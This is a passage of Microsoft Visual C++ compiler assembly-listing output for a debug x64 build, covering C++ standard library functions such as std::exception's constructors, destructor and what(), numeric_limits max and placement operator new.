  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001e	e8 00 00 00 00	 call	 ??1exception@std@@UEAA@XZ ; std::exception::~exception
  00023	8b 85 e8 00 00
	00		 mov	 eax, DWORD PTR __flags$[rbp]
  00029	83 e0 01	 and	 eax, 1
  0002c	85 c0		 test	 eax, eax
  0002e	74 11		 je	 SHORT $LN2@scalar
  00030	ba 18 00 00 00	 mov	 edx, 24
  00035	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN2@scalar:
  00041	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??_Gexception@std@@UEAAPEAXI@Z ENDP			; std::exception::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ?what@exception@std@@UEBAPEBDXZ
_TEXT	SEGMENT
tv69 = 192
this$ = 240
?what@exception@std@@UEBAPEBDXZ PROC			; std::exception::what, COMDAT

; 94   :     {

$LN5:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 95   :         return _Data._What ? _Data._What : "Unknown exception";

  0001f	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 83 78 08 00	 cmp	 QWORD PTR [rax+8], 0
  0002b	74 14		 je	 SHORT $LN3@what
  0002d	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00034	48 8b 40 08	 mov	 rax, QWORD PTR [rax+8]
  00038	48 89 85 c0 00
	00 00		 mov	 QWORD PTR tv69[rbp], rax
  0003f	eb 0e		 jmp	 SHORT $LN4@what
$LN3@what:
  00041	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:??_C@_0BC@EOODALEL@Unknown?5exception@
  00048	48 89 85 c0 00
	00 00		 mov	 QWORD PTR tv69[rbp], rax
$LN4@what:
  0004f	48 8b 85 c0 00
	00 00		 mov	 rax, QWORD PTR tv69[rbp]

; 96   :     }

  00056	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0005d	5f		 pop	 rdi
  0005e	5d		 pop	 rbp
  0005f	c3		 ret	 0
?what@exception@std@@UEBAPEBDXZ ENDP			; std::exception::what
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??1exception@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1exception@std@@UEAA@XZ PROC				; std::exception::~exception, COMDAT

; 89   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7exception@std@@6B@
  0002d	48 89 08	 mov	 QWORD PTR [rax], rcx

; 90   :         __std_exception_destroy(&_Data);

  00030	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00037	48 83 c0 08	 add	 rax, 8
  0003b	48 8b c8	 mov	 rcx, rax
  0003e	e8 00 00 00 00	 call	 __std_exception_destroy

; 91   :     }

  00043	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
??1exception@std@@UEAA@XZ ENDP				; std::exception::~exception
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0exception@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 224
_Other$ = 232
??0exception@std@@QEAA@AEBV01@@Z PROC			; std::exception::exception, COMDAT

; 72   :     {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00024	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7exception@std@@6B@
  00032	48 89 08	 mov	 QWORD PTR [rax], rcx

; 71   :         : _Data()

  00035	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0003c	48 83 c0 08	 add	 rax, 8
  00040	48 8b f8	 mov	 rdi, rax
  00043	33 c0		 xor	 eax, eax
  00045	b9 10 00 00 00	 mov	 ecx, 16
  0004a	f3 aa		 rep stosb

; 73   :         __std_exception_copy(&_Other._Data, &_Data);

  0004c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00053	48 83 c0 08	 add	 rax, 8
  00057	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Other$[rbp]
  0005e	48 83 c1 08	 add	 rcx, 8
  00062	48 8b d0	 mov	 rdx, rax
  00065	e8 00 00 00 00	 call	 __std_exception_copy

; 74   :     }

  0006a	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00071	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00078	5f		 pop	 rdi
  00079	5d		 pop	 rbp
  0007a	c3		 ret	 0
??0exception@std@@QEAA@AEBV01@@Z ENDP			; std::exception::exception
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0exception@std@@QEAA@QEBDH@Z
_TEXT	SEGMENT
this$ = 224
_Message$ = 232
__formal$ = 240
??0exception@std@@QEAA@QEBDH@Z PROC			; std::exception::exception, COMDAT

; 66   :     {

$LN3:
  00000	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00029	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00030	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7exception@std@@6B@
  00037	48 89 08	 mov	 QWORD PTR [rax], rcx

; 65   :         : _Data()

  0003a	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00041	48 83 c0 08	 add	 rax, 8
  00045	48 8b f8	 mov	 rdi, rax
  00048	33 c0		 xor	 eax, eax
  0004a	b9 10 00 00 00	 mov	 ecx, 16
  0004f	f3 aa		 rep stosb

; 67   :         _Data._What = _Message;

  00051	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00058	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Message$[rbp]
  0005f	48 89 48 08	 mov	 QWORD PTR [rax+8], rcx

; 68   :     }

  00063	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0006a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00071	5f		 pop	 rdi
  00072	5d		 pop	 rbp
  00073	c3		 ret	 0
??0exception@std@@QEAA@QEBDH@Z ENDP			; std::exception::exception
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\limits
;	COMDAT ?max@?$numeric_limits@_J@std@@SA_JXZ
_TEXT	SEGMENT
?max@?$numeric_limits@_J@std@@SA_JXZ PROC		; std::numeric_limits<__int64>::max, COMDAT

; 635  :     _NODISCARD static constexpr long long(max)() noexcept {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__09FBC026_limits
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 636  :         return LLONG_MAX;

  0001b	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH

; 637  :     }

  00025	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002c	5f		 pop	 rdi
  0002d	5d		 pop	 rbp
  0002e	c3		 ret	 0
?max@?$numeric_limits@_J@std@@SA_JXZ ENDP		; std::numeric_limits<__int64>::max
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_new.h
;	COMDAT ??2@YAPEAX_KPEAX@Z
_TEXT	SEGMENT
_Size$ = 224
_Where$ = 232
??2@YAPEAX_KPEAX@Z PROC					; operator new, COMDAT

; 168  :     {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__A3D3E4E8_vcruntime_new@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 169  :         (void)_Size;
; 170  :         return _Where;

  00024	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR _Where$[rbp]

; 171  :     }

  0002b	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00032	5f		 pop	 rdi
  00033	5d		 pop	 rbp
  00034	c3		 ret	 0
??2@YAPEAX_KPEAX@Z ENDP					; operator new
_TEXT	ENDS
END
